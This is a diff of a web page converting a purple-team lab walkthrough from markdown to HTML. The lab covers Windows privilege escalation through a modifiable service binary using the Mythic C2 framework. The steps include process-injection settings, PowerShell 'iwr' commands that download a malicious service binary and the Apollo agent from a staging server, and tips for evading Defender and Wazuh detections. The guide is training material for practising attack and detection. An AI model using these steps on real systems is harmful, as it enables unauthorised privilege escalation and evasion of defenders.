@@ -3,7 +3,6 @@ layout: default
 title: "Red Team Engage - Privilege Escalation"
 permalink: /solo-purple-teaming/red-team-engage-privilege-escalation/
 ---
-
 <link rel="stylesheet" href="/assets/css/solo-purple-teaming.css">
 
 <div class="spt-page">
@@ -13,203 +12,200 @@ permalink: /solo-purple-teaming/red-team-engage-privilege-escalation/
 <h1>Red Team Engage - Privilege Escalation</h1>
 </section>
 <section class="spt-content">
-
-Owner: Mike Sterrett
-
-## Introduction
-
-In this phase, we will:
-
-- Enumerate vulnerable services.
-- Attempt privilege escalation.
-- Trigger (and then work toward bypassing) remaining detections.
-- End with a challenge for you to bypass the final detection before moving on to lateral movement.
-
----
-
-### **1. Lab Setup & Context**
-
-- **Starting point:** We already have **initial access** to the target system.
-- **Goal:** Enumerate services, escalate privileges, and attempt to bypass detections.
-- **Note:** One detection will intentionally trigger as a learning challenge.
-
----
-
-### **2. Interact with the Compromised Host**
-
-1. **Double-click** to interact with the existing callback in Mythic.
-2. **Rename the tab** for clarity:
-    - Set the tab description to:
-        
-        ```
-        initial access
-        
-        ```
-        
-        and note the compromised user as `Arlen`.
-        
-
----
-
-### **3. Register the Service Scan Utility**
-
-- In the Mythic interface:
-    1. Use `register assembly`.
-    2. Select **`service scan demo.exe`** from your files.
-    3. Submit the task.
-- **What happens:** The assembly is staged in memory for later execution (not run yet).
-
----
-
-### **4. Configure Injection Technique**
-
-1. Run `get injection techniques`.
-2. Select:
-    
-    ```
-    syscall_x64.ntcreatethreadex
-    
-    ```
-    
-3. Submit to apply this injection method.
-
----
-
-### **5. Set the Spawn Process**
-
-- Change spawn process to:
-    
-    ```
-    smartscreen.exe
-    
-    ```
-    
-    (located in `C:\Windows\System32`)
-    
-
----
-
-### **6. Execute the Service Scan Assembly**
-
-1. Use `execute assembly` on:
-    
-    ```
-    service scan demo.exe
-    
-    ```
-    
-2. Switch to the **assume breach** host to watch for detections.
-3. Confirm **Windows Defender** is enabled:
-    - Go to **Windows Security → Manage Settings**.
-    - **Real-time protection** and **Device Guard protection** should be **on**.
-    - **Automatic sample submission** should be **off** (prevents lab payloads from being uploaded).
-4. **Lab tip:** Keep lab hosts offline unless needed for updates or downloads.
-
----
-
-### **7. Review Service Scan Results**
-
-- Defender does not alert.
-- Service scan output shows:
-    - `ecoin sync` is **vulnerable**.
-    - Current user **can start** the service **and modify** its binary.
-
----
-
-### **8. Cleanup Before Exploiting**
-
-1. Open a shell:
-    
-    ```
-    cd Desktop
-    ls
-    
-    ```
-    
-    - You should see the original `ecoin sync` binaries (malicious and legitimate) from Level 0.
-2. Delete the old malicious binary:
-    
-    ```
-    del ecoin sync.exe
-    
-    ```
-    
-    - **Lesson:** Always reset and clean up after each scenario.
-
----
-
-### **9. Retrieve the Malicious Service Binary**
-
-- Use PowerShell to download `ecoin sync.exe` from your staging server:
-    
-    ```powershell
-    iwr http://192.168.100.101:8000/ecoin_sync.exe -outfile ecoin_sync.exe
-    
-    ```
-    
-    - Using `iwr` bypasses simple static-string detections on `Invoke-WebRequest`.
-- Confirm with:
-    
-    ```
-    ls
-    
-    ```
-    
-    The file should be present on the Desktop.
-    
-
----
-
-### **10. Retrieve Apollo Payload**
-
-- The `ecoin sync` binary will pull and run **Apollo** from the Downloads folder.
-- Download Apollo into `Downloads`:
-    
-    ```powershell
-    iwr http://192.168.100.101:8000/apollo.exe -outfile C:\Users\Arlen\Downloads\apollo.exe
-    
-    ```
-    
-- **Hint:** Think about detections for unsigned executables in `Downloads`.
-
----
-
-### **11. Start the Service**
-
-- From shell:
-    
-    ```
-    sc start "ecoin sync"
-    
-    ```
-    
-- Check Mythic — you should now have a **high-integrity callback** as `SVC ecoin sync`.
-
----
-
-### **12. Check Detection Dashboard**
-
-- In the Wazuh Solo Purple Teaming dashboard:
-    - **One high alert** was a false positive (service enumeration by NT AUTHORITY, not you).
-    - **One medium alert** (correlation detection) **DID trigger**:
-        - Cause: Apollo is unsigned and ran from the `Downloads` folder.
-
----
-
-### **13. Challenge for Students**
-
-Before moving to the next lecture:
-
-- Your task: **Bypass the last detection**.
-- **Hint:** Investigate what calls Apollo from `Downloads` and how you could modify this so it no longer matches the detection rule.
-- Goal: Escalate privileges **without any detection** firing.
-
----
-
-### **14. Next Steps**
-
-- Once you’ve bypassed the last detection, you’re ready for **lateral movement**.
-- In the next lecture, we will gain access to the domain controller.
-
+<p>Owner: Mike Sterrett</p>
+<h2 id="introduction">Introduction</h2>
+<p>In this phase, we will:</p>
+<ul>
+<li>Enumerate vulnerable services.</li>
+<li>Attempt privilege escalation.</li>
+<li>Trigger (and then work toward bypassing) remaining detections.</li>
+<li>End with a challenge for you to bypass the final detection before
+moving on to lateral movement.</li>
+</ul>
+<hr />
+<h3 id="1-lab-setup--context"><strong>1. Lab Setup &amp;
+Context</strong></h3>
+<ul>
+<li><strong>Starting point:</strong> We already have <strong>initial
+access</strong> to the target system.</li>
+<li><strong>Goal:</strong> Enumerate services, escalate privileges, and
+attempt to bypass detections.</li>
+<li><strong>Note:</strong> One detection will intentionally trigger as a
+learning challenge.</li>
+</ul>
+<hr />
+<h3 id="2-interact-with-the-compromised-host"><strong>2. Interact with
+the Compromised Host</strong></h3>
+<ol type="1">
+<li><strong>Double-click</strong> to interact with the existing callback
+in Mythic.</li>
+<li><strong>Rename the tab</strong> for clarity:
+<ul>
+<li><p>Set the tab description to:</p>
+<pre><code>initial access
+</code></pre>
+<p>and note the compromised user as <code>Arlen</code>.</p></li>
+</ul></li>
+</ol>
+<hr />
+<h3 id="3-register-the-service-scan-utility"><strong>3. Register the
+Service Scan Utility</strong></h3>
+<ul>
+<li>In the Mythic interface:
+<ol type="1">
+<li>Use <code>register assembly</code>.</li>
+<li>Select <strong><code>service scan demo.exe</code></strong> from your
+files.</li>
+<li>Submit the task.</li>
+</ol></li>
+<li><strong>What happens:</strong> The assembly is staged in memory for
+later execution (not run yet).</li>
+</ul>
+<hr />
+<h3 id="4-configure-injection-technique"><strong>4. Configure Injection
+Technique</strong></h3>
+<ol type="1">
+<li><p>Run <code>get injection techniques</code>.</p></li>
+<li><p>Select:</p>
+<pre><code>syscall_x64.ntcreatethreadex
+</code></pre></li>
+<li><p>Submit to apply this injection method.</p></li>
+</ol>
+<hr />
+<h3 id="5-set-the-spawn-process"><strong>5. Set the Spawn
+Process</strong></h3>
+<ul>
+<li><p>Change spawn process to:</p>
+<pre><code>smartscreen.exe
+</code></pre>
+<p>(located in <code>C:\Windows\System32</code>)</p></li>
+</ul>
+<hr />
+<h3 id="6-execute-the-service-scan-assembly"><strong>6. Execute the
+Service Scan Assembly</strong></h3>
+<ol type="1">
+<li><p>Use <code>execute assembly</code> on:</p>
+<pre><code>service scan demo.exe
+</code></pre></li>
+<li><p>Switch to the <strong>assume breach</strong> host to watch for
+detections.</p></li>
+<li><p>Confirm <strong>Windows Defender</strong> is enabled:</p>
+<ul>
+<li>Go to <strong>Windows Security → Manage Settings</strong>.</li>
+<li><strong>Real-time protection</strong> and <strong>Device Guard
+protection</strong> should be <strong>on</strong>.</li>
+<li><strong>Automatic sample submission</strong> should be
+<strong>off</strong> (prevents lab payloads from being uploaded).</li>
+</ul></li>
+<li><p><strong>Lab tip:</strong> Keep lab hosts offline unless needed
+for updates or downloads.</p></li>
+</ol>
+<hr />
+<h3 id="7-review-service-scan-results"><strong>7. Review Service Scan
+Results</strong></h3>
+<ul>
+<li>Defender does not alert.</li>
+<li>Service scan output shows:
+<ul>
+<li><code>ecoin sync</code> is <strong>vulnerable</strong>.</li>
+<li>Current user <strong>can start</strong> the service <strong>and
+modify</strong> its binary.</li>
+</ul></li>
+</ul>
+<hr />
+<h3 id="8-cleanup-before-exploiting"><strong>8. Cleanup Before
+Exploiting</strong></h3>
+<ol type="1">
+<li><p>Open a shell:</p>
+<pre><code>cd Desktop
+ls
+</code></pre>
+<ul>
+<li>You should see the original <code>ecoin sync</code> binaries
+(malicious and legitimate) from Level 0.</li>
+</ul></li>
+<li><p>Delete the old malicious binary:</p>
+<pre><code>del ecoin sync.exe
+</code></pre>
+<ul>
+<li><strong>Lesson:</strong> Always reset and clean up after each
+scenario.</li>
+</ul></li>
+</ol>
+<hr />
+<h3 id="9-retrieve-the-malicious-service-binary"><strong>9. Retrieve the
+Malicious Service Binary</strong></h3>
+<ul>
+<li><p>Use PowerShell to download <code>ecoin sync.exe</code> from your
+staging server:</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">iwr</span> http<span class="op">://</span><span class="dv">192.168</span><span class="op">.</span><span class="dv">100.101</span><span class="op">:</span><span class="dv">8000</span><span class="op">/</span>ecoin_sync<span class="op">.</span><span class="fu">exe</span> <span class="op">-</span>outfile ecoin_sync<span class="op">.</span><span class="fu">exe</span></span></code></pre></div>
+<ul>
+<li>Using <code>iwr</code> bypasses simple static-string detections on
+<code>Invoke-WebRequest</code>.</li>
+</ul></li>
+<li><p>Confirm with:</p>
+<pre><code>ls
+</code></pre>
+<p>The file should be present on the Desktop.</p></li>
+</ul>
+<hr />
+<h3 id="10-retrieve-apollo-payload"><strong>10. Retrieve Apollo
+Payload</strong></h3>
+<ul>
+<li><p>The <code>ecoin sync</code> binary will pull and run
+<strong>Apollo</strong> from the Downloads folder.</p></li>
+<li><p>Download Apollo into <code>Downloads</code>:</p>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="fu">iwr</span> http<span class="op">://</span><span class="dv">192.168</span><span class="op">.</span><span class="dv">100.101</span><span class="op">:</span><span class="dv">8000</span><span class="op">/</span>apollo<span class="op">.</span><span class="fu">exe</span> <span class="op">-</span>outfile C<span class="op">:</span>\Users\Arlen\Downloads\apollo<span class="op">.</span><span class="fu">exe</span></span></code></pre></div></li>
+<li><p><strong>Hint:</strong> Think about detections for unsigned
+executables in <code>Downloads</code>.</p></li>
+</ul>
+<hr />
+<h3 id="11-start-the-service"><strong>11. Start the
+Service</strong></h3>
+<ul>
+<li><p>From shell:</p>
+<pre><code>sc start &quot;ecoin sync&quot;
+</code></pre></li>
+<li><p>Check Mythic — you should now have a <strong>high-integrity
+callback</strong> as <code>SVC ecoin sync</code>.</p></li>
+</ul>
+<hr />
+<h3 id="12-check-detection-dashboard"><strong>12. Check Detection
+Dashboard</strong></h3>
+<ul>
+<li>In the Wazuh Solo Purple Teaming dashboard:
+<ul>
+<li><strong>One high alert</strong> was a false positive (service
+enumeration by NT AUTHORITY, not you).</li>
+<li><strong>One medium alert</strong> (correlation detection)
+<strong>DID trigger</strong>:
+<ul>
+<li>Cause: Apollo is unsigned and ran from the <code>Downloads</code>
+folder.</li>
+</ul></li>
+</ul></li>
+</ul>
+<hr />
+<h3 id="13-challenge-for-students"><strong>13. Challenge for
+Students</strong></h3>
+<p>Before moving to the next lecture:</p>
+<ul>
+<li>Your task: <strong>Bypass the last detection</strong>.</li>
+<li><strong>Hint:</strong> Investigate what calls Apollo from
+<code>Downloads</code> and how you could modify this so it no longer
+matches the detection rule.</li>
+<li>Goal: Escalate privileges <strong>without any detection</strong>
+firing.</li>
+</ul>
+<hr />
+<h3 id="14-next-steps"><strong>14. Next Steps</strong></h3>
+<ul>
+<li>Once you’ve bypassed the last detection, you’re ready for
+<strong>lateral movement</strong>.</li>
+<li>In the next lecture, we will gain access to the domain
+controller.</li>
+</ul>
 </section>
 </div>
